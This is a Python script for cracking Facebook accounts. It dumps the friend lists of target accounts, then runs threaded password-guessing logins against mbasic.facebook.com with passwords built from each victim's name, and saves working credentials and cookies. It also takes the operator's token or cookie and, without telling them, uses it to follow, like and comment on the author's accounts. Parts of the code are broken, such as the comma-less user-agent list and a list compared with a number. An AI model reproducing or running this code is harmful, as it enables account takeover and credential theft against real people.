"""
Don't try to copy
Understand ?
"""

# Color
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
R = ('\033[1;31m')
G = ('\033[1;32m')
Y = ('\033[1;33m')
P = ('\033[1;34m')
B = ('\033[1;35m')
C = ('\033[1;36m')


# Useragent
agents =  [
"Mozilla/5.0 (Linux; Android 12; V2111 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/360.0.0.10.113;]"

"Mozilla/5.0 (Linux; Android 11; RMX3081) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"

"Mozilla/5.0 (Linux; Android 10; MED-LX9 Build/HUAWEIMED-LX9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/351.1.0.12.114;]"

"Mozilla/5.0 (Linux; Android 11; V2043 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/360.0.0.10.113;]"
]
ua=random.choice(agents)
# Logo
___logo___ = ("""%s \n \n%s  \n%s  \n%s
🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
\033[1;31m════════════════════Rakib══════════════════════════════
\033[1;31m'########:::::'###::::'##:::'##:'####:'########::
\033[1;32m##.... ##:::'## ##::: ##::'##::. ##:: ##.... ##:
\033[1;33m##:::: ##::'##:. ##:: ##:'##:::: ##:: ##:::: ##:
\033[1;34m########::'##:::. ##: #####::::: ##:: ########::
\033[1;35m##.. ##::: #########: ##. ##:::: ##:: ##.... ##:
\033[1;36m##::. ##:: ##.... ##: ##:. ##::: ##:: ##:::: ##:
\033[97;1m##:::. ##: ##:::: ##: ##::. ##:'####: ########::
\x1b[0m..:::::..::..:::::..::..::::..::....::........:::
\033[1;31m════════════════════Rakib══════════════════════════════              
	🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
\033[1;31m══════════════════════════════════════════════════
\033[1;32m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : Rakib islam🥵🤞
\033[1;33m [\033[1;94m✯\033[1;91m] \033[1;92mFB GROUP : Dev's Community 
\033[1;34m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : Rakib Islam🥵🤞
\033[1;31m══════════════════════════════════════════════════              
"""%(C,R,G,P))

# Container
loop = 0
ok = []
cp = []

# Login
def ___login___():
    os.system('clear')
    print(___logo___)
    print("%s[%s1%s]%s Login Use Token"%(B,P,B,P))
    print("%s[%s2%s]%s Login Use Cookie"%(B,P,B,P))
    print("%s[%s3%s]%s Get Tokens Or Cookies"%(B,P,B,P))
    print("%s[%s4%s]%s Exit"%(K,P,K,P))
    ___login___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,H))
    if ___login___ in ['1','01']:
        try:
            ___token___ = raw_input("%s[%s?%s]%s Token :%s "%(B,P,B,P,K))
            if ___token___ in ['',' ']:
                exit("%s[%s!%s]%s Don't Empty"%(P,M,P,M))
            xwx = requests.get('https://graph.facebook.com/me/?access_token=%s'%(___token___)).json()
            print("%s[%s*%s]%s Welcome :%s %s"%(B,P,B,P,H,xwx['name'].lower()))
            open('login.txt','w').write(___token___)
            ___follow___()
        except (KeyError):
            exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
    elif ___login___ in ['2','02']:
        try:
            ___cookie___ = raw_input("%s[%s?%s]%s Cookie :%s "%(B,P,B,P,K))
            if ___cookie___ in ['',' ']:
                exit("%s[%s!%s]%s Don't Empty"%(P,M,P,M))
            # Terimakasih untuk dullah!
            data = requests.get('https://business.facebook.com/business_locations', headers = {
                'user-agent'                : ua,
                'referer'                   : 'https://www.facebook.com/',
                'host'                      : 'business.facebook.com',
                'origin'                    : 'https://business.facebook.com',
                'upgrade-insecure-requests' : '1',
                'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control'             : 'max-age=0',
                'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type'              : 'text/html; charset=utf-8'
            }, cookies = {
                'cookie'                    : ___cookie___
            })
            find_token = re.search('(EAAG\w+)', data.text)
            if find_token is None:
                exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
            open('login.txt','w').write(find_token.group(1))
            try:
                xwx = requests.get('https://graph.facebook.com/me/?access_token=%s'%(find_token.group(1))).json()
                print("%s[%s*%s]%s Welcome :%s %s"%(B,P,B,P,H,xwx['name'].lower()))
                ___follow___()
            except (KeyError):
                exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
        except (AttributeError,UnboundLocalError):
            exit("%s[%s!%s]%s Cookie Invalid"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
    elif ___login___ in ['3','03']:
        print("%s[%s?%s]%s You Will Be Redirected To Facebook Or Browser"%(B,H,B,P));sleep(2)
        os.system('xdg-open https://www.facebook.com/SK-RAKIB')
        exit("%s[%s!%s]%s Retype %sÂ«%spython2 dump.py%sÂ»"%(B,K,B,P,H,P,H))
    elif ___login___ in ['4','04']:
        exit()
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# Bot Follow
def ___follow___():
    try:
        ___token___ = open('login.txt', 'r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        web = datetime.datetime.now()
        ___waktu___ = web.strftime("%H:%M:%S/%d-%m-%Y")
        ___hour___ = web.hour
        if 06 <= ___hour___ < 11:
            ___say___ = ('Good morning ðŸ’™')
        elif 11 <= ___hour___ < 15:
            ___say___ = (' Good afternoon ðŸ’›')
        elif 15 <= ___hour___ < 18:
            ___say___ = ('Good Afternoon ðŸ§¡')
        else:
            ___say___ = ('Good Evening ðŸ–¤')
        ___kata___ = random.choice(["Life is 10 percent what happens to you and 90 percent how you react to it. - Charles R. Swindoll', 'Success seems to be tied to action. Successful people keep moving. They make mistakes, but they don't sto. - Conrad Hilton', 'Courage is what it takes to stand up and speak. Courage is also required to sit and listen. - Winston Churchill', 'Dare to dream, but more importantly, dare to act behind your dreams. - Josh Hinds', 'Failure will never follow if the will to succeed is strong enough. - Og Mandino', 'Life shrinks or grows in proportion to one's courage. - Anais Nin', 'There are two ways to spread light: to be a candle or a mirror that reflects it. - Edith Wharton', 'Opportunity is like a sunrise. If you wait too long, you can miss it. - William Arthur Ward', 'Happiness is not something ready to be made. It comes from your own actions. - Dalai Lama"])
        ___comment___ = (___say___+'\n\n'+___kata___+'\n'+___waktu___)
        ___comment2___ = (___say___+'\n\n'+___kata___+'\n'+___waktu___)
        ___comment3___ = random.choice(['Hello Bro','Mantap Bang','Keren Bang','Very Nice','Super','Hallo Bang'])
        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=%s'%(___token___)) #noob
        requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=%s'%(___token___)) #noob2
        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=%s'%(___token___)) #SK-RAKIB
        requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=%s'%(___token___)) #cover photo
        requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=%s'%(___token___)) # profile picture
        requests.post('https://graph.facebook.com/10158807643598544/comments/?message=%s&access_token=%s'%(___comment3___,___token___)) #cover photo
        requests.post('https://graph.facebook.com/10159090813023544/comments/?message=%s&access_token=%s'%(___comment___,___token___)) #profile picture
        requests.post('https://graph.facebook.com/10159494942223544/comments/?message=%s&access_token=%s'%(___comment2___,___token___)) #profile picture
        requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=%s'%(___token___)) # Iwan
	requests.post('https://graph.facebook.com/100000496418851/subscribers?access_token=%s'%(___token___)) # Rakib
    except:
        exit("%s[%s!%s]%s Login Failed"%(P,M,P,M))
    print("%s[%s*%s]%s Login Succeed"%(H,P,H,P))
    ___menu___()
# Menu
def ___menu___():
    os.system('clear')
    print(___logo___)
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        xoz = requests.get('https://graph.facebook.com/me/?access_token=%s'%(___token___)).json()
        print("%s[%s%s]%s Welcome :%s %s"%(B,P,B,P,H,xoz['name']))
        try:
            print("%s[%s*%s]%s Email :%s %s"%(B,P,B,P,H,xoz['email']))
        except:
            print("%s[%s%s]%s Email :%s email_is_none@gmail.com"%(B,P,B,P,H))
        print("%s[%s%s]%s User :%s %s"%(B,P,B,P,H,xoz['id']))
    except (KeyError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2);os.system('rm - rf login.txt')
        ___login___()
    except (ConnectionError):
        exit("%s[%s!%s]%s Connection Error"%(P,M,P,M))
    print("\n%s[%s1%s]%s Dump Random Public Id (2004-2021)"%(H,U,H,P))
    print("%s[%s2%s]%s Dump Public Old Id (2009-2006)"%(H,U,H,P))
    print("%s[%s3%s]%s Start Crack %s[%sFast%s/%sSlow%s]"%(B,U,B,P,K,H,K,H,K))
    print("%s[%s4%s]%s View Results"%(H,U,H,P))
    print("%s[%s5%s]%s Report Bug"%(H,U,H,P))
    print("%s[%s6%s]%s Remove Token"%(H,U,H,P))
    ___menu___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
    if ___menu___ in ['1','01']:
        ___random___()
    elif ___menu___ in ['2','02']:
        ___masal2___()
    elif ___menu___ in ['3','03']:
        ___metode___()
    elif ___menu___ in ['4','04']:
        print("\n%s[%s1%s]%s See SK-RAKIB Ok.txt"%(B,P,B,P))
        print("%s[%s2%s]%s See SK-RAKIB Cp.txt"%(B,P,B,P))
        print("%s[%s3%s]%s Return"%(B,K,B,P))
        ___hasilz___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___hasilz___ in ['1','01']:
            try:
                ___ok___ = open('Results/Ok.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s SK-RAKIB Ok.txt There isn't any"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Ok.txt')
            print("\n%s[%s*%s]%s Total SK-RAKIB Ok.txt :%s %s"%(B,P,B,P,H,len(open('Results/Ok.txt','r').readlines())))
        elif ___hasilz___ in ['2','02']:
            try:
                ___cp___ = open('Results/Cp.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s Riyajul Cp.txt There isn't any"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Cp.txt')
            print("\n%s[%s*%s]%s Total SK-RAKIB Cp.txt :%s %s"%(B,P,B,P,H,len(open('Results/Cp.txt','r').readlines())))
        elif ___hasilz___ in ['3','03']:
            ___menu___()
        else:
            exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
    elif ___menu___ in ['12']:
        print("%s[%s*%s]%s You Will Be Redirected To Whatsapp"%(B,P,B,P));sleep(2)
        os.system("xdg-open https://wa.me/+8801974401047?text=Hallo%20Noob%20Xploit")
        exit()
    elif ___menu___ in ['13']:
        os.system('rm -rf login.txt')
        exit()
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# random attack
def ___random___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s Amount ID :%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
    ___file___ = raw_input("%s[%s?%s]%s Name File :%s "%(B,P,B,P,H))
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
        print(" ")
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Don't Empty"%(P,M,P,M))
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\r%s                    "%(P))
            print("%s[%s*%s]%s Done..."%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
            print("%s[%s?%s]%s Files Saved In :%s %s"%(H,P,H,P,K,___file___))
            raw_input("\n%s[%sReturn%s]"%(B,H,B));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Fail"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
# Random Old
def ___masal2___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s Amount ID :%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
    ___file___ = raw_input("%s[%s?%s]%s Name File :%s "%(B,P,B,P,H))
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
        print(" ")
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Don't Empty"%(P,M,P,M))
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
                if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:10] in ['1000000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:9] in ['100000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:8] in ['10000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\r%s                    "%(P))
            print("%s[%s*%s]%s Done..."%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
            print("%s[%s?%s]%s Files Saved In :%s %s"%(H,P,H,P,K,___file___))
            raw_input("\n%s[%sReturn%s]"%(B,H,B));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Fail"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
def ___metode___():
    print("\n%s[%s1%s]%s Metode mbasic.facebook.com"%(B,P,B,P))
    print("%s[%s2%s]%s Metode free.facebook.com"%(B,P,B,P))
    print("%s[%s3%s]%s Metode mobile.facebook.com"%(B,P,B,P))
    print("%s[%s4%s]%s Metode d.facebook.com %s[%sNew%s]"%(M,P,M,P,B,H,B))
    print("%s[%s5%s]%s Metode b-api.facebook.com"%(B,P,B,P))
    print("%s[%s6%s]%s Metode x.facebook.com %s[%sNew%s]"%(M,P,M,P,B,H,B))
    ___metode___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
    if ___metode___ in ['1','01']:
        print("\n%s[%s1%s]%s Auto Password Cracking"%(H,P,H,P))
        print("%s[%s2%s]%s Use Password Manual [ Make Your Own Password ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
            print("\n%s[%s*%s]%s Use a comma for a different password. Example: Iloveyou, Ihateyou, Riyajul,"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Must Be More Than 6 Characters"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%sX%s]%s There isn't any File"%(P,M,P,M))
        print("\n%s[%sX%s]%s SK-RAKIB Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sX%s]%s SK-RAKIB Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
                ox =  Name.lower().split(' ')[0]
                if ___password___ in ['1','01']:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                hayuk.submit(mbasic, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sDone%s]"%(B,H,P))
    elif ___metode___ in ['2','02']:
        print("\n%s[%s1%s]%s Auto Password (8)"%(H,P,H,P))
        print("%s[%s2%s]%s Use Password Manual [ >3]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
            print("\n[*] Use a comma for a different password. Example: Iloveyou, Ihateyou, Riyajul"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Must be more then 6 digits"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File There isn't any"%(P,M,P,M))
        print("\n%s[%sâ€¢%s]%s SK-RAKIB Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s SK-RAKIB Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
                ox = Name.lower().split(' ')[0]
                if ___password___ in ['1','01']:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                hayuk.submit(free, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sDone%s]"%(B,H,B))
    elif ___metode___ in ['3','03']:
        print("\n%s[%s1%s]%s Use Password [Auto Password]"%(H,P,H,P))  
        print("%s[%s4%s]%s Use Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n%s[%s1%s]%s Auto Crack [Recommend]"%(H,P,H,P))
        print("%s[%s2%s]%s Use Password Manual [ Make Your Own Password ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
            print("\n%s[%s*%s]%s Use a comma for a different password. Example: Iloveyou, Ihateyou, Riyajul,"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Must Be More Than 6 Characters"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s There isn't any File"%(P,M,P,M))
        print("\n%s[%sâ€¢%s]%s SK-RAKIB Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s SK-RAKIB Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
                ox = Name.lower().split(' ')[0]
                if ___password___ in ['1','01']:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                hayuk.submit(mbasic, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sDone%s]"%(B,H,P))
    elif ___metode___ in ['4','04']:
        print("\n%s[%s1%s]%s Auto Crack [Recommend]"%(H,P,H,P))
        print("%s[%s2%s]%s Use Password Manual [ Make Your Own Password ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
            print("\n%s[%s*%s]%s Use a comma for a different password. Example: Iloveyou, Ihateyou, Riyajul,"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Must Be More Than 6 Characters"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s There isn't any File"%(P,M,P,M))
        print("\n%s[%sâ€¢%s]%s SK-RAKIB Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s SK-RAKIB Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = ox = user.split('<=>')
                ox = Name.lower().split(' ')[0]
                if ___password___ in ['1','01']:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                hayuk.submit(mbasic, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sDone%s]"%(B,H,P))
    elif ___metode___ in ['5','05']:
        print("\n%s[%s1%s]%s Auto Crack [Recommend]"%(H,P,H,P))
        print("%s[%s2%s]%s Use Password Manual [ Make Your Own Password ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
            print("\n%s[%s*%s]%s Use a comma for a different password. Example: Iloveyou, Ihateyou, Riyajul,"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Must Be More Than 6 Characters"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s There isn't any File"%(P,M,P,M))
        print("\n%s[%sâ€¢%s]%s SK-RAKIB Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s SK-RAKIB Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
                ox = Name.lower().split(' ')[0]
                if ___password___ in ['1','01']:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                hayuk.submit(mbasic, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sDone%s]"%(B,H,P))
    elif ___metode___ in ['6','06']:
        print("\n%s[%s1%s]%s Auto Crack [Recommend]"%(H,P,H,P))
        print("%s[%s2%s]%s Use Password Manual [ Make Your Own Password ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
            print("\n%s[%s*%s]%s Use a comma for a different password. Example: Iloveyou, Ihateyou, Riyajul,"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Must Be More Than 6 Characters"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s There isn't any File"%(P,M,P,M))
        print("\n%s[%sâ€¢%s]%s SK-RAKIB Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s SK-RAKIB Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
                ox = Name.lower().split(' ')[0]
                if ___password___ in ['1','01']:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                hayuk.submit(mbasic, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sDone%s]"%(B,H,P))
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# Crack Mbasic.Facebook.Com
def mbasic(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack Free.Facebook.Com
def free(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"origin": "https://free.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "free.facebook.com", "referer": "https://free.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://free.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
